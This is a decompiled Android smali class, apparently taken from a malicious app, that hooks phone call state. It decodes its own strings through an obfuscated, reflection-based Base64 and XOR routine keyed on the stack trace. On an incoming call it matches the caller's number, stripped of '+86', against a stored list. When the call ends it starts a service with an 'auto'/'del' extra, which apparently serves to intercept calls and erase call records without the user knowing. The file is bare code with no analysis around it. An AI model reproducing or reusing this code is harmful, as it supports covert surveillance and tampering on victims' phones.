.class final Lcom/kk/liushiwu/com/zz/c;
.super Landroid/telephony/PhoneStateListener;


# instance fields
.field final synthetic a:Lcom/kk/liushiwu/com/zz/pr;


# direct methods
.method constructor <init>(Lcom/kk/liushiwu/com/zz/pr;)V
    .locals 0

    iput-object p1, p0, Lcom/kk/liushiwu/com/zz/c;->a:Lcom/kk/liushiwu/com/zz/pr;

    invoke-direct {p0}, Landroid/telephony/PhoneStateListener;-><init>()V

    return-void
.end method

.method private static _10033f9(Ljava/lang/String;)Ljava/lang/String;
    .locals 37

    const/4 v12, 0x0

    const/16 v17, 0x0

    const/4 v15, 0x0

    const/16 v28, 0x0

    const/4 v3, 0x0

    const/16 v27, 0x0

    const/4 v5, 0x0

    const/16 v22, 0x0

    const/16 v23, 0x0

    const/16 v34, 0x13

    move/from16 v0, v34

    new-array v7, v0, [B

    fill-array-data v7, :array_0

    const/16 v34, 0x0

    const/16 v35, 0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v30

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v34, v34, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v31

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v31 .. v31}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x2

    invoke-virtual/range {p0 .. p0}, Ljava/lang/String;->length()I

    move-result v36

    add-int/lit8 v36, v36, -0x2

    move-object/from16 v0, p0

    move/from16 v1, v35

    move/from16 v2, v36

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    move-object/from16 v0, v34

    move-object/from16 v1, v30

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v29

    const/4 v12, 0x0

    :goto_0
    const/16 v34, 0x13

    move/from16 v0, v34

    if-lt v12, v0, :cond_3

    new-instance v28, Ljava/lang/String;

    move-object/from16 v0, v28

    invoke-direct {v0, v7}, Ljava/lang/String;-><init>([B)V

    const/4 v15, 0x2

    const/16 v34, 0x3

    move-object/from16 v0, v28

    move/from16 v1, v34

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v27

    const/16 v15, 0x10

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x11

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v27

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v27 .. v27}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v35, "c"

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const/4 v15, 0x4

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const/16 v35, 0x5

    move-object/from16 v0, v28

    move/from16 v1, v35

    invoke-virtual {v0, v15, v1}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v27

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    :try_start_0
    invoke-static/range {v28 .. v28}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v10

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v4, v0, [Ljava/lang/Class;

    const/16 v34, 0x0

    const-class v35, Ljava/lang/String;

    aput-object v35, v4, v34

    const/16 v34, 0x1

    sget-object v35, Ljava/lang/Integer;->TYPE:Ljava/lang/Class;

    aput-object v35, v4, v34

    invoke-virtual {v10, v3, v4}, Ljava/lang/Class;->getDeclaredMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v14

    const/16 v34, 0x2

    move/from16 v0, v34

    new-array v0, v0, [Ljava/lang/Object;

    move-object/from16 v34, v0

    const/16 v35, 0x0

    aput-object v29, v34, v35

    const/16 v35, 0x1

    const/16 v36, 0x0

    invoke-static/range {v36 .. v36}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v36

    aput-object v36, v34, v35

    move-object/from16 v0, v34

    invoke-virtual {v14, v10, v0}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v34

    move-object/from16 v0, v34

    check-cast v0, [B

    move-object v5, v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/NoSuchMethodException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/lang/IllegalArgumentException; {:try_start_0 .. :try_end_0} :catch_3
    .catch Ljava/lang/reflect/InvocationTargetException; {:try_start_0 .. :try_end_0} :catch_4

    :goto_1
    array-length v0, v5

    move/from16 v20, v0

    move/from16 v21, v20

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v0, v0

    move/from16 v34, v0

    invoke-static/range {v34 .. v34}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v34

    invoke-static/range {v34 .. v34}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v17

    add-int/lit8 v20, v20, -0x1

    sub-int v20, v20, v17

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    const/16 v35, 0x1

    move/from16 v0, v34

    move/from16 v1, v35

    if-ne v0, v1, :cond_4

    const/16 v23, 0x1

    :goto_2
    add-int/lit8 v20, v20, -0x1

    add-int/lit8 v34, v20, -0x2

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v8, v0

    add-int/lit8 v34, v20, -0x1

    aget-byte v34, v5, v34

    move/from16 v0, v34

    int-to-char v9, v0

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static {v8}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-static/range {v35 .. v35}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-static {v9}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v35

    invoke-virtual/range {v34 .. v35}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v32

    const/16 v34, 0x10

    move-object/from16 v0, v32

    move/from16 v1, v34

    invoke-static {v0, v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;I)I

    move-result v34

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v34, v6, -0x79

    move/from16 v0, v34

    int-to-byte v6, v0

    add-int/lit8 v20, v20, -0x2

    const-string v33, ""

    const/4 v12, 0x0

    :goto_3
    move/from16 v0, v20

    if-lt v12, v0, :cond_5

    move/from16 v12, v20

    :goto_4
    move/from16 v0, v21

    if-lt v12, v0, :cond_6

    const/16 v34, 0x1

    move/from16 v0, v23

    move/from16 v1, v34

    if-ne v0, v1, :cond_2

    new-instance v34, Ljava/lang/Exception;

    invoke-direct/range {v34 .. v34}, Ljava/lang/Exception;-><init>()V

    invoke-virtual/range {v34 .. v34}, Ljava/lang/Exception;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v34

    const/16 v35, 0x1

    aget-object v13, v34, v35

    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v25

    const-string v34, "."

    move-object/from16 v0, v25

    move-object/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->lastIndexOf(Ljava/lang/String;)I

    move-result v16

    const/16 v34, -0x1

    move/from16 v0, v16

    move/from16 v1, v34

    if-eq v0, v1, :cond_0

    add-int/lit8 v34, v16, 0x1

    move-object/from16 v0, v25

    move/from16 v1, v34

    invoke-virtual {v0, v1}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v25

    :cond_0
    invoke-virtual {v13}, Ljava/lang/StackTraceElement;->getMethodName()Ljava/lang/String;

    move-result-object v26

    new-instance v34, Ljava/lang/StringBuilder;

    invoke-static/range {v25 .. v25}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v35

    invoke-direct/range {v34 .. v35}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    move-object/from16 v0, v34

    move-object/from16 v1, v26

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v34

    invoke-virtual/range {v34 .. v34}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v24

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    const/16 v35, 0x100

    move/from16 v0, v34

    move/from16 v1, v35

    if-le v0, v1, :cond_1

    const/16 v34, 0x0

    const/16 v35, 0x100

    move-object/from16 v0, v24

    move/from16 v1, v34

    move/from16 v2, v35

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v24

    :cond_1
    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    const/4 v12, 0x0

    move/from16 v19, v18

    :goto_5
    move/from16 v0, v20

    if-lt v12, v0, :cond_7

    :cond_2
    move/from16 v0, v20

    new-array v0, v0, [B

    move-object/from16 v22, v0

    const/4 v12, 0x0

    :goto_6
    move/from16 v0, v20

    if-lt v12, v0, :cond_9

    new-instance v33, Ljava/lang/String;

    move-object/from16 v0, v33

    move-object/from16 v1, v22

    invoke-direct {v0, v1}, Ljava/lang/String;-><init>([B)V

    return-object v33

    :cond_3
    aget-byte v34, v7, v12

    xor-int/lit8 v34, v34, 0x15

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v7, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_0

    :catch_0
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto/16 :goto_1

    :catch_1
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto/16 :goto_1

    :catch_2
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/NoSuchMethodException;->printStackTrace()V

    goto/16 :goto_1

    :catch_3
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/IllegalArgumentException;->printStackTrace()V

    goto/16 :goto_1

    :catch_4
    move-exception v11

    invoke-virtual {v11}, Ljava/lang/reflect/InvocationTargetException;->printStackTrace()V

    goto/16 :goto_1

    :cond_4
    const/16 v23, 0x0

    goto/16 :goto_2

    :cond_5
    aget-byte v34, v5, v12

    xor-int v34, v34, v6

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_3

    :cond_6
    const/16 v34, 0x0

    aput-byte v34, v5, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_4

    :cond_7
    aget-byte v34, v5, v12

    add-int/lit8 v18, v19, -0x1

    move-object/from16 v0, v24

    move/from16 v1, v19

    invoke-virtual {v0, v1}, Ljava/lang/String;->charAt(I)C

    move-result v35

    move/from16 v0, v35

    int-to-byte v0, v0

    move/from16 v35, v0

    xor-int v34, v34, v35

    move/from16 v0, v34

    int-to-byte v0, v0

    move/from16 v34, v0

    aput-byte v34, v5, v12

    if-gez v18, :cond_8

    invoke-virtual/range {v24 .. v24}, Ljava/lang/String;->length()I

    move-result v34

    add-int/lit8 v18, v34, -0x1

    :cond_8
    add-int/lit8 v12, v12, 0x1

    move/from16 v19, v18

    goto/16 :goto_5

    :cond_9
    aget-byte v34, v5, v12

    aput-byte v34, v22, v12

    add-int/lit8 v12, v12, 0x1

    goto/16 :goto_6

    nop

    :array_0
    .array-data 1
        0x74t
        0x7bt
        0x71t
        0x67t
        0x7at
        0x7ct
        0x71t
        0x3bt
        0x60t
        0x61t
        0x7ct
        0x79t
        0x3bt
        0x57t
        0x74t
        0x66t
        0x70t
        0x23t
        0x21t
    .end array-data
.end method


# virtual methods
.method public final onCallStateChanged(ILjava/lang/String;)V
    .locals 3

    invoke-super {p0, p1, p2}, Landroid/telephony/PhoneStateListener;->onCallStateChanged(ILjava/lang/String;)V

    packed-switch p1, :pswitch_data_0

    :cond_0
    :goto_0
    :pswitch_0
    return-void

    :pswitch_1
    new-instance v0, Landroid/content/Intent;

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/c;->a:Lcom/kk/liushiwu/com/zz/pr;

    goto :goto_4

    :goto_1
    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/c;->_10033f9(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    goto :goto_8

    :goto_2
    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/c;->_10033f9(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "U=+zsr02NgHgpjbbgzuL"

    goto :goto_1

    :goto_3
    invoke-virtual {v0, v1, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "auto"

    const-string v2, "del"

    invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/c;->a:Lcom/kk/liushiwu/com/zz/pr;

    goto :goto_5

    :goto_4
    iget-object v1, v1, Lcom/kk/liushiwu/com/zz/pr;->a:Landroid/content/Context;

    const-class v2, Lcom/kk/liushiwu/com/zz/br;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "M=EpNiQrDWE3JSocKDJlCiUxLCkgPz1lCiYCG0EzAUOcNjLy"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/c;->_10033f9(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    goto :goto_9

    :goto_5
    iget-object v1, v1, Lcom/kk/liushiwu/com/zz/pr;->a:Landroid/content/Context;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_6

    :goto_6
    goto :goto_0

    :pswitch_2
    const-string v0, "\\+86"

    const-string v1, ""

    invoke-virtual {p2, v0, v1}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "U=uuq643NQG3monBQDqa"

    goto :goto_2

    :goto_7
    invoke-virtual {v1, v0}, Lcom/kk/liushiwu/com/zz/pr;->a(Ljava/lang/String;)V

    goto :goto_a

    :goto_8
    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replaceFirst(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/c;->a:Lcom/kk/liushiwu/com/zz/pr;

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/pr;->a(Lcom/kk/liushiwu/com/zz/pr;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v1, p0, Lcom/kk/liushiwu/com/zz/c;->a:Lcom/kk/liushiwu/com/zz/pr;

    goto :goto_7

    :goto_9
    invoke-virtual {v0, v1}, Landroid/content/Intent;->addCategory(Ljava/lang/String;)Landroid/content/Intent;

    const-string v1, "==UuJisvDyw0OUUBIaaLMwJS"

    invoke-static {v1}, Lcom/kk/liushiwu/com/zz/c;->_10033f9(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    goto :goto_3

    :goto_a
    goto :goto_0

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_2
        :pswitch_0
    .end packed-switch
.end method
